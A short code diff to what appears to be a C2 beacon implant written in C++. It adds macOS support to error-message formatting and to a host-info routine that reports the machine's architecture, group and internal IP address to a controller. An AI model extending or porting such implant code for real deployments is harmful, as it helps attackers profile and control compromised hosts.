@@ -23,12 +23,16 @@
 
 bool exec::format_error_msg(const int msg_id, c2::TaskData& task, std::vector<char>& msg_rsp)
 {
-	const int len = 128;
-	char buf[len];
-	auto error_msg = strerror_r(errno, buf, len);
-	return format_error_msg(msg_id, error_msg, task, msg_rsp);
-}
+	char temp[256] = {0};
 
+#ifdef _Darwin
+    strerror_r(errno, temp, sizeof(temp));
+	return format_error_msg(msg_id, temp, task, msg_rsp);
+#else
+    auto error_msg = strerror_r(errno, temp, sizeof(temp));
+    return format_error_msg(msg_id, error_msg, task, msg_rsp);
+#endif
+}
 
 bool exec::format_error_msg(const int msg_id, std::string error, c2::TaskData& task, std::vector<char>& msg_rsp)
 {
@@ -73,9 +77,13 @@ bool exec::get_host_info(std::vector<char>& host_data)
 
 	host_info.mutable_dict_value()->insert({ "group", beacon::get_group() });
 
-	host_info.mutable_dict_value()->insert({ "arch", "linux" });
-	host_info.mutable_dict_value()->insert({ "innet_ip", innet_addr });
+	#ifdef _Darwin
+    host_info.mutable_dict_value()->insert({ "arch", "macos" });
+    #else
+    host_info.mutable_dict_value()->insert({ "arch", "linux" });
+    #endif
 
+	host_info.mutable_dict_value()->insert({ "innet_ip", innet_addr });
 	host_data.resize(host_info.ByteSizeLong());
 	host_info.SerializeToArray(host_data.data(), host_data.size());
 
